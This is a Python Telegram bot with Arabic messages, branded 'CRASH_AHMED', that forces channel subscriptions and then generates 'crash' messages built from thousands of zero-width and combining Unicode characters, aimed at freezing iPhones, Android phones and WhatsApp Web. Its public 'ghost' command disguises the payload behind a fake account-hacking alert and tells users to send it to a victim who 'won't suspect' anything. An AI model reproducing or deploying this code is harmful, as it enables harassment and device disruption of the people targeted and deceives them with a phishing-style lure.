import os
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import config

# --- 1. إعداد خادم البقاء (Flask) لضمان استمرار البوت 24/7 ---
app = Flask('')

@app.route('/')
def home():
    return "🛡️ The Beast is Online & Protecting your Empire!"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

Thread(target=run).start()

# --- 2. إعداد البوت والاتصال بـ Telegram API ---
bot = telebot.TeleBot(config.TOKEN)

def check_sub(user_id):
    """التحقق من الاشتراك الإجباري في القنوات"""
    for channel in config.CHANNELS:
        try:
            status = bot.get_chat_member(channel['id'], user_id).status
            if status == 'left':
                return False
        except:
            continue
    return True

# --- 3. واجهة الترحيب (HTML Style) ---

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "<b>☢️ [ SYSTEM ACCESS GRANTED ] ☢️</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "<b>⚠️ WELCOME TO CRASH_AHMED ENGINE v9.9</b>\n\n"
        f"👤 <b>Developer:</b> <code>{config.DEV_NAME}</code>\n"
        f"📞 <b>Contact:</b> <code>{config.DEV_PHONE}</code>\n"
        f"🆔 <b>Status:</b> <u>UNLIMITED POWER</u>\n\n"
        "<b>🤖 البوت يعمل الآن بنظام Year 2099 المطور.</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "<i>يجب عليك تفعيل المفاتيح الأمنية بالاشتراك أدناه:</i>"
    )

    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("📡 Server 1", url=config.CHANNELS[0]['url']),
        types.InlineKeyboardButton("📡 Server 2", url=config.CHANNELS[1]['url']),
        types.InlineKeyboardButton("📺 YouTube", url=config.YOUTUBE),
        types.InlineKeyboardButton("📸 Instagram", url=config.INSTA),
        types.InlineKeyboardButton("🟢 WhatsApp", url=config.WHATSAPP_CH),
    ]
    check_btn = types.InlineKeyboardButton("⚡ ACTIVATE SYSTEM ⚡", callback_data="check")
    
    markup.add(*btns)
    markup.add(check_btn)
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "check")
def verify(call):
    if check_sub(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ تم التحقق من هويتك كوحش!")
        bot.send_message(call.message.chat.id, "😈 <b>أرسل .menu الآن وابدأ القصف الشامل!</b>", parse_mode="HTML")
    else:
        bot.answer_callback_query(call.id, "❌ اشترك أولاً في القنوات يا ضعيف!", show_alert=True)

# --- 4. قائمة التحكم بالأوامر (The Menu) ---

@bot.message_handler(func=lambda m: m.text == ".menu")
def crash_menu(message):
    menu_text = (
        "<b>☢️ CRASH_AHMED v1.0 - CONTROL PANEL ☢️</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "🚀 <b>ترسانة الأسلحة المتاحة:</b>\n\n"
        "🍎 <code>.crash_ios [رقم]</code> \n> حرق نسخة الأيفون وإسقاط النظام.\n\n"
        "🤖 <code>.crash_android [رقم]</code> \n> شلل تام للأندرويد واستنزاف الذاكرة.\n\n"
        "👻 <code>.crash_ghost [رقم]</code> \n> القذيفة الشبحية (تمويه + دمار صامت).\n\n"
        "💻 <code>.crash_web [رقم]</code> \n> إسقاط جلسات واتساب ويب.\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "⚠️ <b>التحذير الأخير:</b> القوة هنا تتخطى كافة الحمايات! ☠️"
    )
    bot.send_message(message.chat.id, menu_text, parse_mode="HTML")

# --- 5. منطق الهجمات التدميرية (The Payloads) ---

@bot.message_handler(func=lambda m: m.text.startswith(".crash_ios"))
def execute_ios_crash(message):
    if message.from_user.id != config.ADMIN_ID:
        bot.reply_to(message, "🚫 <b>عذراً.. هذا السلاح الثقيل مخصص فقط للمطور.</b>", parse_mode="HTML")
        return
    
    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    payload = "🔥🔥" + ("\u200e" * 4000) + "😈" + ("\u200f" * 4000) + "💥"
    
    bot.reply_to(message, f"🚀 <b>جاري قصف {target} بصاعق الأيفون المحسن...</b>", parse_mode="HTML")
    for _ in range(5):
        bot.send_message(message.chat.id, f"💥 <b>iOS_DESTROYER:</b> {target}\n{payload}", parse_mode="HTML")
    bot.send_message(message.chat.id, "✅ <b>تمت المهمة! الأيفون الآن في حالة موت سريري.</b>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith(".crash_android"))
def execute_android_crash(message):
    if message.from_user.id != config.ADMIN_ID:
        bot.reply_to(message, "🚫 <b>سلاح الغاز الرقمي مخصص فقط للمالك.</b>", parse_mode="HTML")
        return

    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    payload_part = ("\u0345" * 3300) + ("\u0ea3" * 3300)
    android_payload = f"☣️ {payload_part} 💀"

    bot.reply_to(message, f"⚡ <b>إطلاق غاز الأعصاب الرقمي على {target}...</b>", parse_mode="HTML")
    for _ in range(3): 
        bot.send_message(message.chat.id, f"💥 <b>ANDROID_CRASH:</b> {target}\n{android_payload}", parse_mode="HTML")
    bot.send_message(message.chat.id, "✅ <b>شلل تام! هاتف الضحية الآن خارج الخدمة.</b>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith(".crash_ghost"))
def execute_ghost_crash(message):
    # متاح للجميع (General Use)
    target = message.text.split(" ")[1] if len(message.text.split(" ")) > 1 else "Target"
    
    fake_header = "📢 <b>عاجل: تم رصد محاولة اختراق لحسابك! اضغط 'قراءة المزيد' لتفعيل الحماية...</b>\n\n"
    trap_space = ("\u200f" * 1000) 
    payload = ("\u0345" * 2500) + ("\u0ea3" * 2500) + ("\u200e" * 2500)
    final_attack = f"{fake_header}{trap_space}{payload}"

    bot.reply_to(message, "🚀 <b>تم تجهيز الفخ الشبحي بنجاح!</b>\n\nقم بنسخ الرسالة التالية وأرسلها، الضحية لن يشك أبداً حتى ينهار جهازه! 😈", parse_mode="HTML")
    bot.send_message(message.chat.id, final_attack, parse_mode="HTML")

# --- 6. بدء التشغيل النهائي ---
if __name__ == "__main__":
    print("💀 [ WARNING ]: The Beast is waking up... Prepare for Impact!")
    bot.infinity_polling()
